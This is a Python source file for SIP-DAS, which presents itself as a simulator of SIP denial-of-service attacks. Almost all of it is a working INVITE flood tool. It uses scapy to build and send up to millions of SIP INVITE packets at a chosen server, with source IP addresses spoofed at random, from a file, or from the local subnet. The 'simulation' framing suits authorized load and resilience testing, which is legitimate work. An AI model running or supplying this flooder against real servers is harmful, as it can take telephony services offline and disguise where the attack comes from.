#!/usr/bin/python
# -*- coding: cp1254 -*-

"""
SIP-DAS.py: SIP-DAS is a tool developed to simulate SIP-based DoS attacks.

# usage-1: sudo ./SIP-DAS.py -i -c <numberofpackets> -s  -d <sipserverIP>
# usage-2: sudo ./SIP-DAS.py -i -c <numberofpackets> -m iplist.txt -d <sipserverIP>
# usage-3: sudo ./SIP-DAS.py -i -c <numberofpackets> -r -d <sipserverIP> 

# File name: SIP-DAS.py
# Date created: 4/26/2017
# Date last modified: 4/28/2017
# Python Version: 2.7

# You need to instal: 
# pip install netifaces
# pip install ipaddress
# apt-get install figlet
# apt-get install toilet
"""

__author__ = "Melih Tas"
__copyright__ = "Copyrgiht 2017"
__credits__ = ["Melih Tas"]
__license__ = "GPL"
__version__ = "1.0.1"
__maintainer__ = "Melih Tas"
__status__ = "Prototype"           


from random import randrange
from optparse import OptionParser
import socket
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from random import randint
import random
import string
import ipaddress, netifaces
import os


conf.verb = 0

os.system("toilet SIP-DAS")
#os.system("figlet -f banner SIP-DAS")
#print "\033[38;5;2mSIP DDoS Attack Simulator\033[0m"

def promisc(state):
# Manage interface promiscuity. valid states are on or off
        ret =  os.system("ip link set " + conf.iface + " promisc " + state)
        if ret == 1:
                print ("You must run this script with root permissions.")
def main():
# Parse options
    sipGen()

def sipGen():
   usage = "usage: %prog [options] arg1 arg2"
   parser = OptionParser(usage=usage)
   parser.add_option("-i", "--invite", action="store_true", dest="invite", default="False", help="Send an INVITE flood.")
   parser.add_option("-c", "--count", type="int", dest="counter", default="99999999", help="Counter for how many messages to send. If not specified, default is flood.")
   parser.add_option("-t", "--tcp", action="store_true", dest="tcp", default=False, help="Use TCP sockets (no spoofing), default is UDP")
   parser.add_option("-d", "--dest", dest="server", help="Destination SIP server")
   parser.add_option("-r", "--random", action="store_true", dest="random", default=False, help="Spoof IP addresses randomly.")
   parser.add_option("-m", "--manual", action="store_true", dest="manual", default=False, help="Spoof IP addresses manually.")
   parser.add_option("-s", "--subnet", action="store_true", dest="subnet", default=False, help="Spoof IP addresses from subnet.")
   (options, args) = parser.parse_args()

# Initialize default values and determine interfce IP that will be sending to server
   counter, i = 0, 0
   client_port, server_port = 5060, 5060
   pkt= IP(dst=options.server)
   client = pkt.src
   # print client
   print ("Client interface " + conf.iface)
   print ("Client interface ip " + client)
   promisc("on")

   counter = options.counter

# sample branch= z9hG4bKnashds7 - size=14 digit, uppercase, lowercase
# sample Call-ID= f9844fbe7dec140ca36500a0c91 size=27, digit, lowercase
# sample tag= 456248 size=6 digit

   while i < counter:
      try:
         branch2=string.lowercase+string.digits+string.uppercase
         branch1=''.join(random.sample(branch2,14))
         clientPort=randint(100,1000)
         callIDprefix2=string.digits+string.lowercase
         callIDprefix=''.join(random.sample(callIDprefix2,27))
         tag1=randint(100000,999999)
         toUser1=random.choice([line.rstrip('\n') for line in open("toUser.txt")])
         fromUser1=random.choice([line.rstrip('\n') for line in open("fromUser.txt")])
         userAgent1=random.choice([line.rstrip('\n') for line in open("userAgent.txt")])
         
         if options.random and not options.tcp:
            client = ".".join([str(randrange(1,255)),str(randrange(1,255)),str(randrange(1,255)),str(randrange(1,255))])
         callid = str(randrange(10000,99999))
         
         #print args[0]
         #print [line.rstrip('\n') for line in open(options.manual)]
         if options.manual and not options.tcp:
            #raw_input("dosya adi girin:\n")
            client=random.choice([line.rstrip('\n') for line in open(args[0])])
         if options.subnet and not options.tcp: 

            interfaceParam = 'eth0'
            ipAdresi = netifaces.ifaddresses(interfaceParam)[2][0]['addr']
            netMask = netifaces.ifaddresses(interfaceParam)[2][0]['netmask']

            client = randomIPAddressForInterface(ipAdresi, netMask)

         #SIP Payload - can be modify as needed!
         if options.invite:
            sip = ("INVITE sip:" + str(toUser1) + "@" + options.server + " SIP/2.0\r\n"
            "Via: SIP/2.0/UDP " + str(client) + ":" + str(clientPort) + ";branch=" + str(branch1) + "\r\n"
            "Max-Forwards: 70\r\n"
            "To: <sip:" + str(toUser1) + "@" + options.server + ":5060>\r\n"
            "From: <sip:" + str(fromUser1) + "@" + str(client) + ";tag=" + str(tag1) + "\r\n"
            "Call-ID: " + str(callIDprefix) + str(callid) + "@" + str(client) +"\r\n"
            "CSeq: 1 INVITE\r\n"
            "Allow: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, NOTIFY, MESSAGE, SUBSCRIBE, INFO\r\n"
            "Contact: <sip:" + str(toUser1) + "@" + str(client) + ":5060>\r\n"
            "User-agent: " + str(userAgent1) +"\r\n"
            "Content-Length: 0\r\n\r\n")

         #Send the packet we built
         if options.tcp:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((options.server, server_port))
            sent=s.send(sip)
         else:
            pkt= IP(src=client, dst=options.server)/UDP(sport=client_port, dport=server_port)/sip
            send(pkt, iface="eth0")
            i +=1
      except (KeyboardInterrupt):
            promisc("off")
            print("Exiting traffic generation...")
            raise SystemExit
            promisc("off")

def random_line(file):
    import random
    #lines = open(file).read().splitlines()
    lines=open(file).read()
    #myline = random.choice(lines)
    return lines

def randomIPAddressForInterface(IP,Netmask):
    targetNetwork = ipaddress.IPv4Network(unicode(IP+'/'+Netmask), strict=False)
    ipCount = int(targetNetwork.num_addresses)
    firstIpAddress = targetNetwork.network_address
    randomInt = random.randint(0,ipCount-1)
    randomIpAddress = (firstIpAddress + randomInt)

    return str(randomIpAddress.exploded)

if __name__ == "__main__":
    main()
